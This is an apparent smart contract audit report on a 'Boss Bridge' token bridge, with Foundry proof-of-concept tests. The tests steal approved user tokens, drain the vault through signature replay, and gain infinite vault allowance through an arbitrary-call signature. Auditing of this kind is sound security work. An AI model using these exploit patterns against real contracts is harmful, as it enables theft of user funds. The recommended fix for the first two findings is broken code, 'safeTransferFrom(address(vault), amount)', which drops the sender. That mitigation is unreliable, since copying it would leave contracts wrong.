[H-1] TITLE (Root Cause -> Impact) Anyone can move tokens to L2 if they are approved by calling `L1BossBridge::depositTokensToL2` function.

Description: In the function `L1BossBridge::depositTokensToL2` anyone can move tokens to L2 if the user has approved.
1. User approves to mve tokens to `L1BossBridge` with some amount.
2. Attacker calls the function `depositTokensToL2` with parameters from the user who approved and in to the attacker puts his address.
3. The added amount gets transfered to the attackers vault.

Impact: The Users tokens can get stolen very easily.

Proof of Concept: Consider adding the below test in your `L1BossBridgeTest.t.sol`.

<details>
<summary>Proof of Code</summary>

```javascript
function testAnyoneCanMoveApprovedTokens() public {
        vm.prank(user);
        token.approve(address(tokenBridge),type(uint256).max);
        uint256 userStartBalance = token.balanceOf(user);
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        tokenBridge.depositTokensToL2(user, attacker, token.balanceOf(user));
        uint256 userEndBalance = token.balanceOf(user);
        vm.stopPrank();
        console2.log("userEndBalance",userEndBalance);
        assertEq(userEndBalance,0);
        assert(token.balanceOf(address(vault)) == userStartBalance);
    }
```
</details>

Recommended Mitigation: I highly recommend you to remove the parameter `address from` from the function `depositTokensToL2`. Conider adding the below changes in the function `depositTokensToL2`.

```diff
function depositTokensToL2(
-        address from,
        address l2Recipient,
        uint256 amount
    ) external whenNotPaused {
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
-        token.safeTransferFrom(from, address(vault), amount);
+        token.safeTransferFrom(address(vault), amount);
-        emit Deposit(from, l2Recipient, amount);
+        emit Deposit(l2Recipient, amount);
    }
```






[H-2] TITLE (Root Cause -> Impact) Anyone can transfer funds from the vault just by calling `L1BossBridge::depositTokensToL2` function.

Description: Due to this from paramteter in the function `depositTokensToL2` an attacker can even transfer funcds present in the contract to the vault and due to this the attacker can mint many tokens to his address and can even steal funds from the vault.

Impact: Attacker can mint all the tokens to themselves.

Proof of Concept: Consider adding the below test in your `L1BossBridgeTest.t.sol`.

<details>
<summary>Proof of Code</summary>

```javascript
function testAnyoneCanTranferFromVault() public {
        address attacker = makeAddr("attacker");
        uint256 amount = 500 ether;
        deal(address(token),address(vault),amount);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), attacker, amount);
        tokenBridge.depositTokensToL2(address(vault), attacker, amount);

        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), attacker, amount);
        tokenBridge.depositTokensToL2(address(vault), attacker, amount);
    }
```

</details>

Recommended Mitigation: I highly recommend you to remove the parameter `address from` from the function `depositTokensToL2`. Conider adding the below changes in the function `depositTokensToL2`.

```diff
function depositTokensToL2(
-        address from,
        address l2Recipient,
        uint256 amount
    ) external whenNotPaused {
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
-        token.safeTransferFrom(from, address(vault), amount);
+        token.safeTransferFrom(address(vault), amount);
-        emit Deposit(from, l2Recipient, amount);
+        emit Deposit(l2Recipient, amount);
    }
```



[H-3] TITLE (Root Cause -> Impact) Easy signature repay attack possible in the function `withdrawTokensToL1`.

Description: When the user wants to withdraw token from L2 to L1,then the user sends some withdrawal data which is then signed by the operator of the contract which allows the execution of transfer, but an attacker can use the signature as many times he wants because there are no checks for reusing the signature like nonce.

Impact: The attacker can drain out all the funds from the vault by using the signature again and again.

Proof of Concept: 
1. Attacker deposits some tokens in L2 by calling `depositTokensToL2`.
2. Then attacker wants to withdraw the tokens from L2 so before the actual transfer, a message is signed by the operator.
3. Attacker amount gets transfered, attacker again withdraws the amount by using the signature and then again, till the vault gets empty.

Consider adding the below code in your `L1BossBridgeTest.t.sol`.

<details>
<summary>Proof of Code</summary>

```javascript
 function testSignatureReplayAttack() public {
        Account memory boss = makeAccount("boss");
        vm.prank(tokenBridge.owner());
        tokenBridge.setSigner(boss.addr, true);
        address attacker = makeAddr("attacker");
        deal(address(token),attacker,100e18);
        deal(address(token),address(vault),1000e18);
        vm.startPrank(attacker);
        token.approve(address(tokenBridge),type(uint256).max);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(attacker, attacker, 100e18);
        tokenBridge.depositTokensToL2(attacker, attacker, 100e18);
        bytes memory message = abi.encode(address(token),0, abi.encodeWithSelector(IERC20.transferFrom.selector,address(vault),attacker,100e18));
        (uint8 v,bytes32 r,bytes32 s) = vm.sign(boss.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
        while (token.balanceOf(address(vault)) > 0) {
            tokenBridge.withdrawTokensToL1(attacker, 100e18, v, r, s);
        }
        assertEq(token.balanceOf(address(vault)),0);
        assertEq(token.balanceOf(attacker),1100e18);
        vm.stopPrank();
    }
```

</details>

Recommended Mitigation: Consider redesigning the withdrawal mechanism so that it includes replay protection, like using some nonce and some checks as well.






[H-4] TITLE (Root Cause -> Impact) `L1BossBridge::sendToL1` allowing arbitrary calls enables users to call `L1Vault::approveTo` and give themselves infinite allowance of vault funds

Description: The function `sendToL1` in the contract allows arbitrary calls as we know that attacker can reuse the signature and through `sendToL1` by submitting the signature attacker can call the function `approveTo` in the contract `L1Vault` and get allowance of the whole protocol including draining all the funds from the vault.

```javascript
function sendToL1(
        uint8 v,
        bytes32 r,
        bytes32 s,
        bytes memory message
    ) public nonReentrant whenNotPaused {
        address signer = ECDSA.recover(
            MessageHashUtils.toEthSignedMessageHash(keccak256(message)),
            v,
            r,
            s
        );

        if (!signers[signer]) {
            revert L1BossBridge__Unauthorized();
        }

        (address target, uint256 value, bytes memory data) = abi.decode(
            message,
            (address, uint256, bytes)
        );

@>        (bool success, ) = target.call{value: value}(data);
        if (!success) {
            revert L1BossBridge__CallFailed();
        }
    }
```

Impact: Attacker can get allowance of the whole contract and can easily drain all the funds from the contract.

Proof of Concept: Consider including the following test in the `L1BossBridge.t.sol` file:

<details>
<summary>Proof of Code</summary>

```javascript
 function testCanCallVaultApproveFromBridgeAndDrainVault() public {
        Account memory boss = makeAccount("boss");
        vm.prank(tokenBridge.owner());
        tokenBridge.setSigner(boss.addr, true);
        address attacker = makeAddr("attacker");
        deal(address(token),attacker,100e18);
        deal(address(token),address(vault),1000e18);
        vm.startPrank(attacker);
        token.approve(address(tokenBridge),type(uint256).max);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(attacker, attacker, 100e18);
        tokenBridge.depositTokensToL2(attacker, attacker, 100e18);
        bytes memory message = abi.encode(address(vault),0, abi.encodeCall(L1Vault.approveTo,(address(attacker),type(uint256).max)));
        (uint8 v,bytes32 r,bytes32 s) = vm.sign(boss.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
        tokenBridge.sendToL1(v, r, s, message);
        token.transferFrom(address(vault),attacker,token.balanceOf(address(vault)));
        assertEq(token.balanceOf(attacker),1100e18);
        vm.stopPrank();
    }
```

</details>

Recommended Mitigation: Consider disallowing attacker-controlled external calls to sensitive components of the bridge, such as the `L1Vault` contract.








[L-1] TITLE (Root Cause -> Impact) Function `L1BossBridge::depositTokensToL2` does not follow CEI.

Description: Its always a good practice to follow checks then effects and then interactions, but in the function `depositTokensToL2` first the external call is sent and then the event is emitted.

Recommended Mitigation: Consider following the below code in your `depositTokensToL2` function.

```diff
function depositTokensToL2(
        address from,
        address l2Recipient,
        uint256 amount
    ) external whenNotPaused {
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
+       emit Deposit(from, l2Recipient, amount);
        token.safeTransferFrom(from, address(vault), amount);
-       emit Deposit(from, l2Recipient, amount);
    }
```






[L-2] TITLE (Root Cause -> Impact) Function `TokenFactory::deployToken` should be marked as external.

Description: If a function in not called in that contract then it should be marked as external instead of public so due to this, `deployToken` should be marked as external.

Recommended Mitigation: Consider following the below code in your `deployToken` function.

```diff
-           function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner 
+           function deployToken(string memory symbol, bytes memory contractBytecode) external onlyOwner 
returns (address addr) {
        assembly {
            // @audit-high- this is not allowed in zksync
            addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
        }
        s_tokenToAddress[symbol] = addr;
        emit TokenDeployed(symbol, addr);
    }
```




[L-3] TITLE (Root Cause -> Impact) Function `TokenFactory::getTokenAddressFromSymbol` should be marked as external.

Description: If a function in not called in that contract then it should be marked as external instead of public so due to this, `getTokenAddressFromSymbol` should be marked as external.

Recommended Mitigation: Consider following the below code in your `getTokenAddressFromSymbol` function.

```diff
-        function getTokenAddressFromSymbol(string memory symbol) public view returns (address addr) {
+        function getTokenAddressFromSymbol(string memory symbol) external view returns (address addr) {
        return s_tokenToAddress[symbol];
    }
```




[L-4] TITLE (Root Cause -> Impact) `L1BossBridge::DEPOSIT_LIMIT` should be marked as constant.

Description: If the value of any storage variable is fixed so it should be marked as constant, hence `L1BossBridge::DEPOSIT_LIMIT` should be marked as constant.

Recommended Mitigation: Consider adding the below code in `L1BossBridge` contract:

```diff
-    uint256 public DEPOSIT_LIMIT = 100_000 ether;
+    uint256 public constant DEPOSIT_LIMIT = 100_000 ether
```




[L-5] TITLE (Root Cause -> Impact) `L1Vault::token` should be marked as immutable.

Recommended Mitigation: Consider adding the below code in `L1Vault` contract:
```diff
-    IERC20 public token;
+    IERC20 public immutable token;
```


[L-6] TITLE (Root Cause -> Impact) Function `L1Vault::approveTo` should return a bool value but it's ignored.

Recommended Mitigation: Consider adding the below code in `approveTo` function:

```diff
-      function approveTo(address target, uint256 amount) external onlyOwner {
+      function approveTo(address target, uint256 amount) external onlyOwner returns(bool) {
       token.approve(target, amount);
+      return true;
    }
```


[L-7] TITLE (Root Cause -> Impact) Function `L1BossBridge::setSigner` should emit an event.

Description: There are state variable changing in the function `setSigner` but no event is emitted. Consider emitting an event to enable offchain indexers to track the changes.

Recommended Mitigation: Consider adding the below code in `L1BossBridge::setSigner`:

```diff
+   event SignerChanged(address newSigner);
    function setSigner(address account, bool enabled) external onlyOwner {
    signers[account] = enabled;
+   emit SignerChanged(account);     
    }
```